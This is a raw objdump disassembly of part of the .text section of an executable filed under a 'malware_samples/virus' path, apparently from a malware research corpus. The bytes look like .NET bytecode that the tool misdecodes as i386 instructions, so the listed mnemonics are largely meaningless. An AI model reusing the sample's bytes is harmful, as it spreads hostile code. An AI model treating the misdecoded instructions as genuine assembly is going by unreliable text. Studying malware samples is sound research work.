
malware_samples/virus/f3210c79aa14c4cdc23aae147281140b7d1bdd8e38411a08ef2178fb2cdefd00.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	40                   	inc    %eax
  402001:	5a                   	pop    %edx
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 38 2e 00    	add    %al,0x2e3800
  402013:	00 94 2a 00 00 03 00 	add    %dl,0x30000(%edx,%ebp,1)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	0c 00                	or     $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	05 00 29 08 00       	add    $0x82900,%eax
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 02                	adc    %eax,(%edx)
  40205d:	28 10                	sub    %dl,(%eax)
  40205f:	00 00                	add    %al,(%eax)
  402061:	0a 28                	or     (%eax),%ch
  402063:	11 00                	adc    %eax,(%eax)
  402065:	00 0a                	add    %cl,(%edx)
  402067:	7d 01                	jge    0x40206a
  402069:	00 00                	add    %al,(%eax)
  40206b:	04 02                	add    $0x2,%al
  40206d:	14 7d                	adc    $0x7d,%al
  40206f:	02 00                	add    (%eax),%al
  402071:	00 04 02             	add    %al,(%edx,%eax,1)
  402074:	28 12                	sub    %dl,(%edx)
  402076:	00 00                	add    %al,(%eax)
  402078:	0a 00                	or     (%eax),%al
  40207a:	00 00                	add    %al,(%eax)
  40207c:	02 28                	add    (%eax),%ch
  40207e:	0b 00                	or     (%eax),%eax
  402080:	00 06                	add    %al,(%esi)
  402082:	00 7e 13             	add    %bh,0x13(%esi)
  402085:	00 00                	add    %al,(%eax)
  402087:	0a 72 01             	or     0x1(%edx),%dh
  40208a:	00 00                	add    %al,(%eax)
  40208c:	70 17                	jo     0x4020a5
  40208e:	6f                   	outsl  %ds:(%esi),(%dx)
  40208f:	14 00                	adc    $0x0,%al
  402091:	00 0a                	add    %cl,(%edx)
  402093:	0a 00                	or     (%eax),%al
  402095:	00 06                	add    %al,(%esi)
  402097:	72 5d                	jb     0x4020f6
  402099:	00 00                	add    %al,(%eax)
  40209b:	70 72                	jo     0x40210f
  40209d:	73 00                	jae    0x40209f
  40209f:	00 70 28             	add    %dh,0x28(%eax)
  4020a2:	10 00                	adc    %al,(%eax)
  4020a4:	00 0a                	add    %cl,(%edx)
  4020a6:	72 73                	jb     0x40211b
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	70 28                	jo     0x4020d4
  4020ac:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4020b1:	16                   	push   %ss
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	0a 00                	or     (%eax),%al
  4020b6:	00 de                	add    %bl,%dh
  4020b8:	05 26 00 00 de       	add    $0xde000026,%eax
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	00 de                	add    %bl,%dh
  4020c1:	12 06                	adc    (%esi),%al
  4020c3:	14 fe                	adc    $0xfe,%al
  4020c5:	01 13                	add    %edx,(%ebx)
  4020c7:	27                   	daa
  4020c8:	11 27                	adc    %esp,(%edi)
  4020ca:	2d 07 06 6f 17       	sub    $0x176f0607,%eax
  4020cf:	00 00                	add    %al,(%eax)
  4020d1:	0a 00                	or     (%eax),%al
  4020d3:	dc 00                	faddl  (%eax)
  4020d5:	7e 18                	jle    0x4020ef
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	0a 72 77             	or     0x77(%edx),%dh
  4020dc:	00 00                	add    %al,(%eax)
  4020de:	70 6f                	jo     0x40214f
  4020e0:	19 00                	sbb    %eax,(%eax)
  4020e2:	00 0a                	add    %cl,(%edx)
  4020e4:	0b 00                	or     (%eax),%eax
  4020e6:	00 07                	add    %al,(%edi)
  4020e8:	72 e3                	jb     0x4020cd
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	70 28                	jo     0x402116
  4020ee:	10 00                	adc    %al,(%eax)
  4020f0:	00 0a                	add    %cl,(%edx)
  4020f2:	17                   	pop    %ss
  4020f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f4:	1a 00                	sbb    (%eax),%al
  4020f6:	00 0a                	add    %cl,(%edx)
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	de 05 26 00 00 de    	fiadds 0xde000026
  402100:	00 00                	add    %al,(%eax)
  402102:	00 de                	add    %bl,%dh
  402104:	12 07                	adc    (%edi),%al
  402106:	14 fe                	adc    $0xfe,%al
  402108:	01 13                	add    %edx,(%ebx)
  40210a:	27                   	daa
  40210b:	11 27                	adc    %esp,(%edi)
  40210d:	2d 07 07 6f 17       	sub    $0x176f0707,%eax
  402112:	00 00                	add    %al,(%eax)
  402114:	0a 00                	or     (%eax),%al
  402116:	dc 00                	faddl  (%eax)
  402118:	17                   	pop    %ss
  402119:	16                   	push   %ss
  40211a:	16                   	push   %ss
  40211b:	28 01                	sub    %al,(%ecx)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	06                   	push   %es
  402120:	00 00                	add    %al,(%eax)
  402122:	1f                   	pop    %ds
  402123:	2b 28                	sub    (%eax),%ebp
  402125:	1b 00                	sbb    (%eax),%eax
  402127:	00 0a                	add    %cl,(%edx)
  402129:	0c 1b                	or     $0x1b,%al
  40212b:	28 1b                	sub    %bl,(%ebx)
  40212d:	00 00                	add    %al,(%eax)
  40212f:	0a 0d 1f 17 28 1b    	or     0x1b28171f,%cl
  402135:	00 00                	add    %al,(%eax)
  402137:	0a 13                	or     (%ebx),%dl
  402139:	04 1f                	add    $0x1f,%al
  40213b:	28 28                	sub    %ch,(%eax)
  40213d:	1b 00                	sbb    (%eax),%eax
  40213f:	00 0a                	add    %cl,(%edx)
  402141:	13 05 16 28 1b 00    	adc    0x1b2816,%eax
  402147:	00 0a                	add    %cl,(%edx)
  402149:	13 06                	adc    (%esi),%eax
  40214b:	02 08                	add    (%eax),%cl
  40214d:	28 03                	sub    %al,(%ebx)
  40214f:	00 00                	add    %al,(%eax)
  402151:	06                   	push   %es
  402152:	00 02                	add    %al,(%edx)
  402154:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402157:	03 00                	add    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	00 02                	add    %al,(%edx)
  40215d:	09 28                	or     %ebp,(%eax)
  40215f:	03 00                	add    (%eax),%eax
  402161:	00 06                	add    %al,(%esi)
  402163:	00 02                	add    %al,(%edx)
  402165:	11 05 28 03 00 00    	adc    %eax,0x328
  40216b:	06                   	push   %es
  40216c:	00 02                	add    %al,(%edx)
  40216e:	11 06                	adc    %eax,(%esi)
  402170:	28 03                	sub    %al,(%ebx)
  402172:	00 00                	add    %al,(%eax)
  402174:	06                   	push   %es
  402175:	00 02                	add    %al,(%edx)
  402177:	08 28                	or     %ch,(%eax)
  402179:	04 00                	add    $0x0,%al
  40217b:	00 06                	add    %al,(%esi)
  40217d:	00 02                	add    %al,(%edx)
  40217f:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402182:	04 00                	add    $0x0,%al
  402184:	00 06                	add    %al,(%esi)
  402186:	00 02                	add    %al,(%edx)
  402188:	09 28                	or     %ebp,(%eax)
  40218a:	04 00                	add    $0x0,%al
  40218c:	00 06                	add    %al,(%esi)
  40218e:	00 02                	add    %al,(%edx)
  402190:	11 05 28 04 00 00    	adc    %eax,0x428
  402196:	06                   	push   %es
  402197:	00 02                	add    %al,(%edx)
  402199:	11 06                	adc    %eax,(%esi)
  40219b:	28 04 00             	sub    %al,(%eax,%eax,1)
  40219e:	00 06                	add    %al,(%esi)
  4021a0:	00 72 ef             	add    %dh,-0x11(%edx)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	70 13                	jo     0x4021ba
  4021a7:	07                   	pop    %es
  4021a8:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4021ab:	00 0a                	add    %cl,(%edx)
  4021ad:	13 08                	adc    (%eax),%ecx
  4021af:	11 07                	adc    %eax,(%edi)
  4021b1:	11 08                	adc    %ecx,(%eax)
  4021b3:	72 03                	jb     0x4021b8
  4021b5:	01 00                	add    %eax,(%eax)
  4021b7:	70 28                	jo     0x4021e1
  4021b9:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021be:	09 11                	or     %edx,(%ecx)
  4021c0:	07                   	pop    %es
  4021c1:	11 08                	adc    %ecx,(%eax)
  4021c3:	72 15                	jb     0x4021da
  4021c5:	01 00                	add    %eax,(%eax)
  4021c7:	70 28                	jo     0x4021f1
  4021c9:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021ce:	0a 11                	or     (%ecx),%dl
  4021d0:	07                   	pop    %es
  4021d1:	11 08                	adc    %ecx,(%eax)
  4021d3:	72 23                	jb     0x4021f8
  4021d5:	01 00                	add    %eax,(%eax)
  4021d7:	70 28                	jo     0x402201
  4021d9:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021de:	0b 11                	or     (%ecx),%edx
  4021e0:	07                   	pop    %es
  4021e1:	11 08                	adc    %ecx,(%eax)
  4021e3:	72 03                	jb     0x4021e8
  4021e5:	01 00                	add    %eax,(%eax)
  4021e7:	70 28                	jo     0x402211
  4021e9:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021ee:	0c 11                	or     $0x11,%al
  4021f0:	07                   	pop    %es
  4021f1:	11 08                	adc    %ecx,(%eax)
  4021f3:	72 37                	jb     0x40222c
  4021f5:	01 00                	add    %eax,(%eax)
  4021f7:	70 28                	jo     0x402221
  4021f9:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021fe:	0d 11 07 11 08       	or     $0x8110711,%eax
  402203:	72 4d                	jb     0x402252
  402205:	01 00                	add    %eax,(%eax)
  402207:	70 28                	jo     0x402231
  402209:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40220e:	0e                   	push   %cs
  40220f:	11 07                	adc    %eax,(%edi)
  402211:	11 08                	adc    %ecx,(%eax)
  402213:	72 63                	jb     0x402278
  402215:	01 00                	add    %eax,(%eax)
  402217:	70 28                	jo     0x402241
  402219:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40221e:	0f 11 07             	movups %xmm0,(%edi)
  402221:	11 08                	adc    %ecx,(%eax)
  402223:	72 77                	jb     0x40229c
  402225:	01 00                	add    %eax,(%eax)
  402227:	70 28                	jo     0x402251
  402229:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40222e:	10 11                	adc    %dl,(%ecx)
  402230:	07                   	pop    %es
  402231:	11 08                	adc    %ecx,(%eax)
  402233:	72 85                	jb     0x4021ba
  402235:	01 00                	add    %eax,(%eax)
  402237:	70 28                	jo     0x402261
  402239:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40223e:	11 11                	adc    %edx,(%ecx)
  402240:	07                   	pop    %es
  402241:	11 08                	adc    %ecx,(%eax)
  402243:	72 99                	jb     0x4021de
  402245:	01 00                	add    %eax,(%eax)
  402247:	70 28                	jo     0x402271
  402249:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40224e:	12 11                	adc    (%ecx),%dl
  402250:	07                   	pop    %es
  402251:	11 08                	adc    %ecx,(%eax)
  402253:	72 b3                	jb     0x402208
  402255:	01 00                	add    %eax,(%eax)
  402257:	70 28                	jo     0x402281
  402259:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40225e:	13 11                	adc    (%ecx),%edx
  402260:	07                   	pop    %es
  402261:	11 08                	adc    %ecx,(%eax)
  402263:	72 c9                	jb     0x40222e
  402265:	01 00                	add    %eax,(%eax)
  402267:	70 28                	jo     0x402291
  402269:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40226e:	14 11                	adc    $0x11,%al
  402270:	07                   	pop    %es
  402271:	11 08                	adc    %ecx,(%eax)
  402273:	72 dd                	jb     0x402252
  402275:	01 00                	add    %eax,(%eax)
  402277:	70 28                	jo     0x4022a1
  402279:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  40227e:	15 02 11 09 28       	adc    $0x28091102,%eax
  402283:	03 00                	add    (%eax),%eax
  402285:	00 06                	add    %al,(%esi)
  402287:	00 02                	add    %al,(%edx)
  402289:	11 0a                	adc    %ecx,(%edx)
  40228b:	28 03                	sub    %al,(%ebx)
  40228d:	00 00                	add    %al,(%eax)
  40228f:	06                   	push   %es
  402290:	00 02                	add    %al,(%edx)
  402292:	11 0b                	adc    %ecx,(%ebx)
  402294:	28 03                	sub    %al,(%ebx)
  402296:	00 00                	add    %al,(%eax)
  402298:	06                   	push   %es
  402299:	00 02                	add    %al,(%edx)
  40229b:	11 0c 28             	adc    %ecx,(%eax,%ebp,1)
  40229e:	03 00                	add    (%eax),%eax
  4022a0:	00 06                	add    %al,(%esi)
  4022a2:	00 02                	add    %al,(%edx)
  4022a4:	11 0d 28 03 00 00    	adc    %ecx,0x328
  4022aa:	06                   	push   %es
  4022ab:	00 02                	add    %al,(%edx)
  4022ad:	11 0e                	adc    %ecx,(%esi)
  4022af:	28 03                	sub    %al,(%ebx)
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	06                   	push   %es
  4022b4:	00 02                	add    %al,(%edx)
  4022b6:	11 0f                	adc    %ecx,(%edi)
  4022b8:	28 03                	sub    %al,(%ebx)
  4022ba:	00 00                	add    %al,(%eax)
  4022bc:	06                   	push   %es
  4022bd:	00 02                	add    %al,(%edx)
  4022bf:	11 10                	adc    %edx,(%eax)
  4022c1:	28 03                	sub    %al,(%ebx)
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	06                   	push   %es
  4022c6:	00 02                	add    %al,(%edx)
  4022c8:	11 11                	adc    %edx,(%ecx)
  4022ca:	28 03                	sub    %al,(%ebx)
  4022cc:	00 00                	add    %al,(%eax)
  4022ce:	06                   	push   %es
  4022cf:	00 02                	add    %al,(%edx)
  4022d1:	11 12                	adc    %edx,(%edx)
  4022d3:	28 03                	sub    %al,(%ebx)
  4022d5:	00 00                	add    %al,(%eax)
  4022d7:	06                   	push   %es
  4022d8:	00 02                	add    %al,(%edx)
  4022da:	11 13                	adc    %edx,(%ebx)
  4022dc:	28 03                	sub    %al,(%ebx)
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	06                   	push   %es
  4022e1:	00 02                	add    %al,(%edx)
  4022e3:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  4022e6:	03 00                	add    (%eax),%eax
  4022e8:	00 06                	add    %al,(%esi)
  4022ea:	00 02                	add    %al,(%edx)
  4022ec:	11 15 28 03 00 00    	adc    %edx,0x328
  4022f2:	06                   	push   %es
  4022f3:	00 02                	add    %al,(%edx)
  4022f5:	1f                   	pop    %ds
  4022f6:	1a 28                	sbb    (%eax),%ch
  4022f8:	1b 00                	sbb    (%eax),%eax
  4022fa:	00 0a                	add    %cl,(%edx)
  4022fc:	28 03                	sub    %al,(%ebx)
  4022fe:	00 00                	add    %al,(%eax)
  402300:	06                   	push   %es
  402301:	00 02                	add    %al,(%edx)
  402303:	1f                   	pop    %ds
  402304:	2e 28 1b             	sub    %bl,%cs:(%ebx)
  402307:	00 00                	add    %al,(%eax)
  402309:	0a 28                	or     (%eax),%ch
  40230b:	03 00                	add    (%eax),%eax
  40230d:	00 06                	add    %al,(%esi)
  40230f:	00 02                	add    %al,(%edx)
  402311:	1f                   	pop    %ds
  402312:	36 28 1b             	sub    %bl,%ss:(%ebx)
  402315:	00 00                	add    %al,(%eax)
  402317:	0a 28                	or     (%eax),%ch
  402319:	03 00                	add    (%eax),%eax
  40231b:	00 06                	add    %al,(%esi)
  40231d:	00 02                	add    %al,(%edx)
  40231f:	1f                   	pop    %ds
  402320:	35 28 1b 00 00       	xor    $0x1b28,%eax
  402325:	0a 28                	or     (%eax),%ch
  402327:	03 00                	add    (%eax),%eax
  402329:	00 06                	add    %al,(%esi)
  40232b:	00 02                	add    %al,(%edx)
  40232d:	1f                   	pop    %ds
  40232e:	37                   	aaa
  40232f:	28 1b                	sub    %bl,(%ebx)
  402331:	00 00                	add    %al,(%eax)
  402333:	0a 28                	or     (%eax),%ch
  402335:	03 00                	add    (%eax),%eax
  402337:	00 06                	add    %al,(%esi)
  402339:	00 02                	add    %al,(%edx)
  40233b:	1f                   	pop    %ds
  40233c:	19 28                	sbb    %ebp,(%eax)
  40233e:	1b 00                	sbb    (%eax),%eax
  402340:	00 0a                	add    %cl,(%edx)
  402342:	28 03                	sub    %al,(%ebx)
  402344:	00 00                	add    %al,(%eax)
  402346:	06                   	push   %es
  402347:	00 1f                	add    %bl,(%edi)
  402349:	28 28                	sub    %ch,(%eax)
  40234b:	1b 00                	sbb    (%eax),%eax
  40234d:	00 0a                	add    %cl,(%edx)
  40234f:	13 16                	adc    (%esi),%edx
  402351:	11 16                	adc    %edx,(%esi)
  402353:	28 1d 00 00 0a 13    	sub    %bl,0x130a0000
  402359:	17                   	pop    %ss
  40235a:	11 16                	adc    %edx,(%esi)
  40235c:	28 1e                	sub    %bl,(%esi)
  40235e:	00 00                	add    %al,(%eax)
  402360:	0a 13                	or     (%ebx),%dl
  402362:	18 16                	sbb    %dl,(%esi)
  402364:	28 1b                	sub    %bl,(%ebx)
  402366:	00 00                	add    %al,(%eax)
  402368:	0a 13                	or     (%ebx),%dl
  40236a:	19 72 ed             	sbb    %esi,-0x13(%edx)
  40236d:	01 00                	add    %eax,(%eax)
  40236f:	70 28                	jo     0x402399
  402371:	1f                   	pop    %ds
  402372:	00 00                	add    %al,(%eax)
  402374:	0a 13                	or     (%ebx),%dl
  402376:	1a 11                	sbb    (%ecx),%dl
  402378:	1a 72 05             	sbb    0x5(%edx),%dh
  40237b:	02 00                	add    (%eax),%al
  40237d:	70 28                	jo     0x4023a7
  40237f:	20 00                	and    %al,(%eax)
  402381:	00 0a                	add    %cl,(%edx)
  402383:	13 1b                	adc    (%ebx),%ebx
  402385:	72 19                	jb     0x4023a0
  402387:	02 00                	add    (%eax),%al
  402389:	70 13                	jo     0x40239e
  40238b:	1c 1f                	sbb    $0x1f,%al
  40238d:	24 28                	and    $0x28,%al
  40238f:	1b 00                	sbb    (%eax),%eax
  402391:	00 0a                	add    %cl,(%edx)
  402393:	13 1d 11 1d 72 59    	adc    0x59721d11,%ebx
  402399:	02 00                	add    (%eax),%al
  40239b:	70 28                	jo     0x4023c5
  40239d:	21 00                	and    %eax,(%eax)
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	13 1e                	adc    (%esi),%ebx
  4023a3:	11 1e                	adc    %ebx,(%esi)
  4023a5:	72 85                	jb     0x40232c
  4023a7:	02 00                	add    (%eax),%al
  4023a9:	70 28                	jo     0x4023d3
  4023ab:	21 00                	and    %eax,(%eax)
  4023ad:	00 0a                	add    %cl,(%edx)
  4023af:	72 93                	jb     0x402344
  4023b1:	02 00                	add    (%eax),%al
  4023b3:	70 28                	jo     0x4023dd
  4023b5:	22 00                	and    (%eax),%al
  4023b7:	00 0a                	add    %cl,(%edx)
  4023b9:	00 11                	add    %dl,(%ecx)
  4023bb:	1c 72                	sbb    $0x72,%al
  4023bd:	85 02                	test   %eax,(%edx)
  4023bf:	00 70 28             	add    %dh,0x28(%eax)
  4023c2:	21 00                	and    %eax,(%eax)
  4023c4:	00 0a                	add    %cl,(%edx)
  4023c6:	72 93                	jb     0x40235b
  4023c8:	02 00                	add    (%eax),%al
  4023ca:	70 28                	jo     0x4023f4
  4023cc:	22 00                	and    (%eax),%al
  4023ce:	00 0a                	add    %cl,(%edx)
  4023d0:	00 11                	add    %dl,(%ecx)
  4023d2:	1e                   	push   %ds
  4023d3:	28 1d 00 00 0a 13    	sub    %bl,0x130a0000
  4023d9:	1f                   	pop    %ds
  4023da:	16                   	push   %ss
  4023db:	13 20                	adc    (%eax),%esp
  4023dd:	2b 22                	sub    (%edx),%esp
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	11 1f                	adc    %ebx,(%edi)
  4023e3:	11 20                	adc    %esp,(%eax)
  4023e5:	9a 72 93 02 00 70 28 	lcall  $0x2870,$0x29372
  4023ec:	22 00                	and    (%eax),%al
  4023ee:	00 0a                	add    %cl,(%edx)
  4023f0:	00 00                	add    %al,(%eax)
  4023f2:	de 05 26 00 00 de    	fiadds 0xde000026
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	00 11                	add    %dl,(%ecx)
  4023fc:	20 17                	and    %dl,(%edi)
  4023fe:	d6                   	salc
  4023ff:	13 20                	adc    (%eax),%esp
  402401:	11 20                	adc    %esp,(%eax)
  402403:	11 1f                	adc    %ebx,(%edi)
  402405:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402408:	04 13                	add    $0x13,%al
  40240a:	27                   	daa
  40240b:	11 27                	adc    %esp,(%edi)
  40240d:	2d d0 00 11 17       	sub    $0x171100d0,%eax
  402412:	13 28                	adc    (%eax),%ebp
  402414:	16                   	push   %ss
  402415:	13 29                	adc    (%ecx),%ebp
  402417:	2b 22                	sub    (%edx),%esp
  402419:	11 28                	adc    %ebp,(%eax)
  40241b:	11 29                	adc    %ebp,(%ecx)
  40241d:	9a 13 21 00 00 02 11 	lcall  $0x1102,$0x2113
  402424:	21 28                	and    %ebp,(%eax)
  402426:	03 00                	add    (%eax),%eax
  402428:	00 06                	add    %al,(%esi)
  40242a:	00 00                	add    %al,(%eax)
  40242c:	de 05 26 00 00 de    	fiadds 0xde000026
  402432:	00 00                	add    %al,(%eax)
  402434:	00 11                	add    %dl,(%ecx)
  402436:	29 17                	sub    %edx,(%edi)
  402438:	58                   	pop    %eax
  402439:	13 29                	adc    (%ecx),%ebp
  40243b:	11 29                	adc    %ebp,(%ecx)
  40243d:	11 28                	adc    %ebp,(%eax)
  40243f:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402442:	04 13                	add    $0x13,%al
  402444:	27                   	daa
  402445:	11 27                	adc    %esp,(%edi)
  402447:	2d d0 02 11 16       	sub    $0x161102d0,%eax
  40244c:	28 03                	sub    %al,(%ebx)
  40244e:	00 00                	add    %al,(%eax)
  402450:	06                   	push   %es
  402451:	00 16                	add    %dl,(%esi)
  402453:	13 20                	adc    (%eax),%esp
  402455:	2b 1e                	sub    (%esi),%ebx
  402457:	00 00                	add    %al,(%eax)
  402459:	02 11                	add    (%ecx),%dl
  40245b:	18 11                	sbb    %dl,(%ecx)
  40245d:	20 9a 28 03 00 00    	and    %bl,0x328(%edx)
  402463:	06                   	push   %es
  402464:	00 00                	add    %al,(%eax)
  402466:	de 05 26 00 00 de    	fiadds 0xde000026
  40246c:	00 00                	add    %al,(%eax)
  40246e:	00 11                	add    %dl,(%ecx)
  402470:	20 17                	and    %dl,(%edi)
  402472:	d6                   	salc
  402473:	13 20                	adc    (%eax),%esp
  402475:	11 20                	adc    %esp,(%eax)
  402477:	11 18                	adc    %ebx,(%eax)
  402479:	8e 69 fe             	mov    -0x2(%ecx),%gs
  40247c:	04 13                	add    $0x13,%al
  40247e:	27                   	daa
  40247f:	11 27                	adc    %esp,(%edi)
  402481:	2d d4 1d 28 1b       	sub    $0x1b281dd4,%eax
  402486:	00 00                	add    %al,(%eax)
  402488:	0a 13                	or     (%ebx),%dl
  40248a:	22 02                	and    (%edx),%al
  40248c:	11 22                	adc    %esp,(%edx)
  40248e:	28 05 00 00 06 00    	sub    %al,0x60000
  402494:	73 23                	jae    0x4024b9
  402496:	00 00                	add    %al,(%eax)
  402498:	0a 13                	or     (%ebx),%dl
  40249a:	23 00                	and    (%eax),%eax
  40249c:	00 11                	add    %dl,(%ecx)
  40249e:	23 6f 24             	and    0x24(%edi),%ebp
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	0a 72 34             	or     0x34(%edx),%dh
  4024a6:	03 00                	add    (%eax),%eax
  4024a8:	70 72                	jo     0x40251c
  4024aa:	34 03                	xor    $0x3,%al
  4024ac:	00 70 6f             	add    %dh,0x6f(%eax)
  4024af:	25 00 00 0a 00       	and    $0xa0000,%eax
  4024b4:	00 11                	add    %dl,(%ecx)
  4024b6:	23 72 38             	and    0x38(%edx),%esi
  4024b9:	03 00                	add    (%eax),%eax
  4024bb:	70 11                	jo     0x4024ce
  4024bd:	22 72 e5             	and    -0x1b(%edx),%dh
  4024c0:	03 00                	add    (%eax),%eax
  4024c2:	70 28                	jo     0x4024ec
  4024c4:	21 00                	and    %eax,(%eax)
  4024c6:	00 0a                	add    %cl,(%edx)
  4024c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c9:	26 00 00             	add    %al,%es:(%eax)
  4024cc:	0a 00                	or     (%eax),%al
  4024ce:	11 23                	adc    %esp,(%ebx)
  4024d0:	72 03                	jb     0x4024d5
  4024d2:	04 00                	add    $0x0,%al
  4024d4:	70 11                	jo     0x4024e7
  4024d6:	22 72 b2             	and    -0x4e(%edx),%dh
  4024d9:	04 00                	add    $0x0,%al
  4024db:	70 28                	jo     0x402505
  4024dd:	21 00                	and    %eax,(%eax)
  4024df:	00 0a                	add    %cl,(%edx)
  4024e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e2:	26 00 00             	add    %al,%es:(%eax)
  4024e5:	0a 00                	or     (%eax),%al
  4024e7:	11 23                	adc    %esp,(%ebx)
  4024e9:	72 d2                	jb     0x4024bd
  4024eb:	04 00                	add    $0x0,%al
  4024ed:	70 11                	jo     0x402500
  4024ef:	22 72 89             	and    -0x77(%edx),%dh
  4024f2:	05 00 70 28 21       	add    $0x21287000,%eax
  4024f7:	00 00                	add    %al,(%eax)
  4024f9:	0a 6f 26             	or     0x26(%edi),%ch
  4024fc:	00 00                	add    %al,(%eax)
  4024fe:	0a 00                	or     (%eax),%al
  402500:	11 23                	adc    %esp,(%ebx)
  402502:	72 a9                	jb     0x4024ad
  402504:	05 00 70 11 22       	add    $0x22117000,%eax
  402509:	72 5a                	jb     0x402565
  40250b:	06                   	push   %es
  40250c:	00 70 28             	add    %dh,0x28(%eax)
  40250f:	21 00                	and    %eax,(%eax)
  402511:	00 0a                	add    %cl,(%edx)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	26 00 00             	add    %al,%es:(%eax)
  402517:	0a 00                	or     (%eax),%al
  402519:	11 23                	adc    %esp,(%ebx)
  40251b:	72 86                	jb     0x4024a3
  40251d:	06                   	push   %es
  40251e:	00 70 11             	add    %dh,0x11(%eax)
  402521:	22 72 35             	and    0x35(%edx),%dh
  402524:	07                   	pop    %es
  402525:	00 70 28             	add    %dh,0x28(%eax)
  402528:	21 00                	and    %eax,(%eax)
  40252a:	00 0a                	add    %cl,(%edx)
  40252c:	6f                   	outsl  %ds:(%esi),(%dx)
  40252d:	26 00 00             	add    %al,%es:(%eax)
  402530:	0a 00                	or     (%eax),%al
  402532:	11 23                	adc    %esp,(%ebx)
  402534:	72 5b                	jb     0x402591
  402536:	07                   	pop    %es
  402537:	00 70 11             	add    %dh,0x11(%eax)
  40253a:	22 72 24             	and    0x24(%edx),%dh
  40253d:	08 00                	or     %al,(%eax)
  40253f:	70 28                	jo     0x402569
  402541:	21 00                	and    %eax,(%eax)
  402543:	00 0a                	add    %cl,(%edx)
  402545:	6f                   	outsl  %ds:(%esi),(%dx)
  402546:	26 00 00             	add    %al,%es:(%eax)
  402549:	0a 00                	or     (%eax),%al
  40254b:	11 23                	adc    %esp,(%ebx)
  40254d:	72 3e                	jb     0x40258d
  40254f:	08 00                	or     %al,(%eax)
  402551:	70 11                	jo     0x402564
  402553:	22 72 d5             	and    -0x2b(%edx),%dh
  402556:	08 00                	or     %al,(%eax)
  402558:	70 28                	jo     0x402582
  40255a:	21 00                	and    %eax,(%eax)
  40255c:	00 0a                	add    %cl,(%edx)
  40255e:	6f                   	outsl  %ds:(%esi),(%dx)
  40255f:	26 00 00             	add    %al,%es:(%eax)
  402562:	0a 00                	or     (%eax),%al
  402564:	11 23                	adc    %esp,(%ebx)
  402566:	72 ef                	jb     0x402557
  402568:	08 00                	or     %al,(%eax)
  40256a:	70 11                	jo     0x40257d
  40256c:	22 72 ec             	and    -0x14(%edx),%dh
  40256f:	09 00                	or     %eax,(%eax)
  402571:	70 28                	jo     0x40259b
  402573:	21 00                	and    %eax,(%eax)
  402575:	00 0a                	add    %cl,(%edx)
  402577:	6f                   	outsl  %ds:(%esi),(%dx)
  402578:	26 00 00             	add    %al,%es:(%eax)
  40257b:	0a 00                	or     (%eax),%al
  40257d:	00 de                	add    %bl,%dh
  40257f:	05 26 00 00 de       	add    $0xde000026,%eax
  402584:	00 00                	add    %al,(%eax)
  402586:	00 de                	add    %bl,%dh
  402588:	05 26 00 00 de       	add    $0xde000026,%eax
  40258d:	00 00                	add    %al,(%eax)
  40258f:	00 de                	add    %bl,%dh
  402591:	14 11                	adc    $0x11,%al
  402593:	23 14 fe             	and    (%esi,%edi,8),%edx
  402596:	01 13                	add    %edx,(%ebx)
  402598:	27                   	daa
  402599:	11 27                	adc    %esp,(%edi)
  40259b:	2d 08 11 23 6f       	sub    $0x6f231108,%eax
  4025a0:	17                   	pop    %ss
  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	0a 00                	or     (%eax),%al
  4025a5:	dc 00                	faddl  (%eax)
  4025a7:	02 72 08             	add    0x8(%edx),%dh
  4025aa:	0a 00                	or     (%eax),%al
  4025ac:	70 28                	jo     0x4025d6
  4025ae:	07                   	pop    %es
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	06                   	push   %es
  4025b2:	00 02                	add    %al,(%edx)
  4025b4:	72 42                	jb     0x4025f8
  4025b6:	0a 00                	or     (%eax),%al
  4025b8:	70 28                	jo     0x4025e2
  4025ba:	07                   	pop    %es
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
